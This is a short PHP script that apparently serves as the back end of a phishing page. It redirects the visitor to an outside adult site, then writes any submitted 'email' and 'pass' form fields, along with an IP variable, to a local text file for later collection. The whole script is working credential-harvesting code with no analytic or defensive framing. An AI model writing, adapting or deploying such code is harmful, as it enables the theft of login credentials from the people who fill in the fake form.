<?php

Header ('Location: http://javhd.pro/');


$path="ahihidongu.txt";
$file=fopen($path, "a+");
$write=fwrite($file,"$ip\n");
fclose($file);

$handle = fopen("ahihidongu.txt", "a");
foreach($_POST as $variable => $value) {
if ($variable == 'email' or $variable =='pass')
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
}
fwrite($handle, "\r\n");
fclose($handle);
exit;






?>
